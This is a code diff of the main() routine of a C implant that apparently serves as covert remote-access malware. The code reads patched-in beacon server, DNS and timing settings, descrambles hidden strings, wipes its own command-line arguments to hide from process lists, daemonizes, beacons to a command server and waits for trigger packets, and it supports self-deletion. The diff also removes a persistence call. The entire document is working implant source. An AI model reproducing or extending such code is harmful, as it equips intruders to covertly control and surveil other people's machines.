@@ -61,27 +61,24 @@ int dbug_level_ = 2;				// debug level
 //**************************************************************
 // Patchable command line arguments
 
-struct cl_args
-{
+struct __attribute__ ((packed)) cl_args {
 	unsigned int	sig;
 	unsigned int	beacon_port;
-	unsigned int	host_len;
-	char			beacon_ip[256];
-	char			dns[2][16];
-	char			iface[16];
-	unsigned char   idKey[ID_KEY_HASH_SIZE];
+	unsigned int	trigger_delay;
 	unsigned long	init_delay;
 	unsigned int	interval;
-	unsigned int	trigger_delay;
 	unsigned int	jitter;
 	unsigned long	delete_delay;
-	char			sdpath[SD_PATH_LENGTH];
-	unsigned int	patched;
+	unsigned int	patched;						// Patched flag
+	unsigned char   idKey[ID_KEY_HASH_SIZE];
+	char			sdpath[SD_PATH_LENGTH];			// Path of self-delete control files
+	char			beacon_ip[256];					// Domain name or IP address of beacon server
+	char			dns[2][16];						// DNS server IP addresses (up to 2) in dotted quad format
 };
 
 #define SIG_HEAD	0x7AD8CFB6
 
-struct cl_args		args;
+struct cl_args		args = {SIG_HEAD, 443, 0, 0, 0, 0, 0, 0, {0}, {0}, {0}, {{0}} };
 
 //**************************************************************
 D (
@@ -113,38 +110,27 @@ static void printUsage(char* exeName)
 )
 
 //**************************************************************
+
 static int is_elevated_permissions( void );
 static void clean_args( int argc, char *argv[], char *new_argv0 );
 static void * asloc( char *string );
 
-
-
 //**************************************************************
+
 int main(int argc, char** argv)
 {
 	int				c = 0;
-	char			*dnsIP = args.dns[0];
 	struct in_addr	beaconIPaddr;
-	char			*szInterface = NULL;
 	int				trigger_delay = DEFAULT_TRIGGER_DELAY;
 	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
 	int				retVal = 0;
 	char			sdpath[SD_PATH_LENGTH] = {0};
 	FILE			*f;
 	struct stat 	st;
+	BEACONINFO 		beaconInfo;
 #ifndef DEBUG
 	int				status = 0;
 #endif
-
-	BEACONINFO beaconInfo;
-
-	memset(&args, 0 , sizeof(struct cl_args));
-	args.sig = SIG_HEAD;
-	memset(&beaconInfo, 0, sizeof(BEACONINFO));
-	beaconInfo.port = DEFAULT_BEACON_PORT;
-	beaconInfo.initDelay = DEFAULT_INITIAL_DELAY;
-	beaconInfo.interval = DEFAULT_BEACON_INTERVAL;
-	beaconInfo.percentVariance = DEFAULT_BEACON_JITTER * 0.01f;
 
  	ikey[0] = '\0';
 	init_strings(); 	// De-scramble strings
@@ -163,7 +149,6 @@ int main(int argc, char** argv)
         initSrandFlag = 1;
     }
 
-
 	//To See Crypto Keys, ENABLE THIS SECTION with debug level 4...
 #if 0
 	DLX(4,
@@ -177,38 +162,50 @@ int main(int argc, char** argv)
 
 	if (args.patched == 1) {
 		// Binary was patched -- all patched times should already be in milliseconds
-		DLX(1, printf("Binary was patched with arguments\n"));
-
-		beaconInfo.host = args.beacon_ip;
 		beaconInfo.port = args.beacon_port;
-		szInterface = args.iface;
+		trigger_delay = args.trigger_delay;
 		beaconInfo.initDelay = args.init_delay;
 		beaconInfo.interval = args.interval;
-		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
-		trigger_delay = args.trigger_delay;
-		delete_delay = args.delete_delay;
 		beaconInfo.percentVariance = args.jitter * 0.01f;
+		delete_delay = args.delete_delay;
+
+		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
 		memcpy(sdpath, args.sdpath, SD_PATH_LENGTH * sizeof(char));
-
-		cl_string( (unsigned char *)args.beacon_ip, args.host_len );
-		beaconInfo.ip[args.host_len] = '\0';
-		DLX(1, printf("\tDecoded patched value for hostname/IP: %s\n", beaconInfo.ip));
-		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
-		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
 		cl_string((unsigned char *)sdpath, sizeof(sdpath));
-		DLX(1, printf( "\tDecoded sdpath: %s\n", sdpath));
-		strncpy(sdcfp, sdpath, strlen(sdpath));
 
-		DLX(1, printf( "\tDecoded DNS server address: %s\n", dnsIP));
+		cl_string((unsigned char *)args.beacon_ip, sizeof(args.beacon_ip));
+		beaconInfo.host = args.beacon_ip;
+
+		cl_string((unsigned char *)args.dns[0], sizeof(args.dns[0]));
+		cl_string((unsigned char *)args.dns[1], sizeof(args.dns[1]));
+		strcpy(beaconInfo.dns[0], args.dns[0]);
+		strcpy(beaconInfo.dns[1], args.dns[1]);
+		strcpy(sdcfp, sdpath);
+
+#if 0	// Enable for debugging of patched binaries
+		printf("\nBinary was patched with arguments as follows:\n");
+		printf("\t%32s: %-s\n", "Beacon Server IP address", beaconInfo.host);
+		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
+		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
+		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
+		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
+		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
+		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
+		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
+		printf("\t%32s: %-s\n", "Self Delete Control File Path", sdpath);
+		printf("\t%32s: %-d\n\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
+#endif
 
 		goto patched_binary;
+	} else {
+		beaconInfo.port = DEFAULT_BEACON_PORT;
 	}
 	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
 	// process options
 	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
 #ifdef DEBUG
-	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:P:p:S:s:t:")) != -1)
+	while((c = getopt(argc, argv, "a:cD:d:hi:j:K:k:P:p:S:s:t:")) != -1)
 #else
 	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
 #endif
@@ -231,11 +228,6 @@ int main(int argc, char** argv)
 				beaconInfo.initDelay = strtoul(optarg, NULL, 0) * 1000;
 				break;
 
-			case 'I':
-				// TODO: new option. what validation is needed?
-				szInterface = asloc( optarg );
-				break;
-
 			case 'i':
 				// user enters delay in seconds and this is converted to milliseconds
 				beaconInfo.interval = atoi(optarg) * 1000;
@@ -256,16 +248,16 @@ int main(int argc, char** argv)
 					if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
 //						fprintf(stderr, "Option error\n");
 						fprintf(stderr, "%s\n", oe1);
-						return -1;
+						return -2;
 					}
 
 					if (access(optarg, R_OK)) {
 						fprintf(stderr, "%s\n", oe2);
-						return -1;
+						return -3;
 					}
 					if (stat(optarg, &statbuf) != 0) {
 						perror("Option K");
-						return -1;
+						return -3;
 					}
 					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text is of sufficient length
 						sha1_file((const char *)optarg, ikey);				// Generate the ID key
@@ -275,7 +267,7 @@ int main(int argc, char** argv)
 						DLX(1, printf("\n\n\n" ));
 					} else {
 						fprintf(stderr, "%s\n", oe3);
-						return -1;
+						return -4;
 					}
 					break;
 				}
@@ -287,12 +279,12 @@ int main(int argc, char** argv)
 				if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
 //					fprintf(stderr, "%s\n" "Option error");
 					fprintf(stderr, "%s\n", oe1);
-					return -1;
+					return -2;
 				}
 
-				if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
+				if (strlen( optarg ) < ID_KEY_LENGTH_MIN) {
 					fprintf(stderr, "%s\n", oe3);
-            		return -1;
+            		return -4;
 				}
 				DLX(1, printf( "KeyPhrase: %s \n", optarg));
 				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
@@ -311,7 +303,7 @@ int main(int argc, char** argv)
 					strcpy(sdcfp, optarg);				// Copy the path from the argument
 				} else {
 					fprintf(stderr, "%s\n", sde);
-					return -1;
+					return -5;
 				}
 				break;
 
@@ -325,20 +317,20 @@ int main(int argc, char** argv)
 					if ((dns = strtok(address_list, ","))) {
 						if (strlen(dns) > 16) {
 							fprintf(stderr, "%s\n", oe4);
-							return -1;
+							return -6;
 						}
 						memcpy(beaconInfo.dns[0], dns, strlen(dns));
 					} else {
 						beaconInfo.dns[0][0] = '\0';
 						fprintf(stderr, "%s\n", sdf);	// Parameter missing
-						return -1;
+						return -7;
 					}
 
 					// Get 2nd DNS server address if it was entered and validate its length
 					if ((dns = strtok(NULL, ","))) {
 						if (strlen(dns) > 16) {
 							fprintf(stderr, "%s\n", oe4);
-							return -1;
+							return -6;
 						}
 						memcpy(beaconInfo.dns[1], dns, strlen(dns));
 					} else
@@ -369,16 +361,16 @@ int main(int argc, char** argv)
 	if (beaconInfo.initDelay > 0 && beaconInfo.interval == 0 ) {
 		DLX(1, printf("No Beacon Interval specified!\n"));
 		DLX(1, printUsage(argv[0]));
-		return -1;
+		return -8;
 	}
 	if  (beaconInfo.initDelay >= (INT_MAX-1)) {
 		DLX(1, printUsage(argv[0]));
-		return -1;
+		return -9;
 	}
 
 	if (ikey[0] == '\0') {
 		DLX(1, printUsage(argv[0]));
-		return 0;
+		return -10;
 	}
 
 	clean_args(argc, argv, NULL);	// Zero command line arguments
@@ -389,29 +381,28 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 
 	if (beaconInfo.initDelay > 0) {			// Beacons enabled
 
-		if (beaconInfo.port == -1) {
+		if (beaconInfo.port == 0) {
 			DLX(1, printf("No Beacon Port Specified!\n"));
 			DLX(1, printUsage(argv[0]));
 		}
 
-		// Obtain Beacon IP address
-		if (beaconInfo.host == NULL) {
+		if (beaconInfo.host == NULL) {	// At this point, the domain name or IP address appears in beaconInfo.host
 				DLX(1, printf("No Beacon IP address specified!\n"));
 				DLX(1, printUsage(argv[0]));
-				return -1;
+				return -11;
 		}
 
 		if (inet_pton(AF_INET, beaconInfo.host, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
 			if (args.dns[0] == NULL && args.patched == 0) {					// If not, verify that a DNS server address was specified
 				DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
-				return -1;
+				return -12;
 			}
 		}
 	}
 
 	// Construct self delete control and log files with full path names
 	if (strlen((const char *)sdcfp) == 0) {
-			strcpy(sdcfp, (const char *)sddp);
+			strcpy(sdcfp, (const char *)sddp);		// If the path wasn't specified use the default ("/var")
 	}
 
 	if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
@@ -438,13 +429,16 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 		DLX(1, printf("\"%s\" file already exists\n", (char *)sdcfp ));
 	}
 
-	if ( args.patched == 1 ) {
-		retVal = EnablePersistence(beaconInfo.ip, beaconInfo.port);
-		if( 0 > retVal) {
-			DLX(1, printf("\nCould not enable Persistence!\n"));
-			return -1;
-		}
-	}
+#if 0	// Enable for debugging of patched binaries
+	printf("\nStarting beacon with the following parameters:\n");
+	printf("\t%32s: %-s\n", "Beacon Server", beaconInfo.host);
+	printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo.port);
+	printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo.dns[0]);
+	printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo.dns[1]);
+	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay);
+	printf("\t%32s: %-i\n", "Initial Beacon Delay (sec)", beaconInfo.interval);
+	printf("\t%32s: %-f\n\n", "Initial Beacon Delay (sec)", beaconInfo.percentVariance);
+#endif
 
 #ifndef DEBUG
 	status = daemonize();	// for Linux and Solaris
@@ -458,7 +452,6 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 		// create beacon thread
 		DLX(1, printf( "Calling BeaconStart()\n"));
 		retVal = beacon_start(&beaconInfo);
-	
 		if (0 != retVal) {
 			DLX(1, printf("Beacon Failed to Start!\n"));
 		}
@@ -471,14 +464,14 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 
 #ifndef __VALGRIND__
 	DLX(2, printf( "\tCalling TriggerListen()\n"));
-	(void)TriggerListen( szInterface, trigger_delay, delete_delay );	//TODO: TriggerListen() doesn't return a meaningful value.
+	(void)TriggerListen(trigger_delay, delete_delay);	//TODO: TriggerListen() doesn't return a meaningful value.
 #endif
 
     return 0;
 }
 
 //****************************************************************************
-// used to copy argv[] elements out so they can be zeriozed, if permitted by the OS
+// used to copy argv[] elements out so they can be zeroed, if permitted by the OS
 // Most helpful for unix-like systems and their process lists
 static void * asloc( char *string )
 {
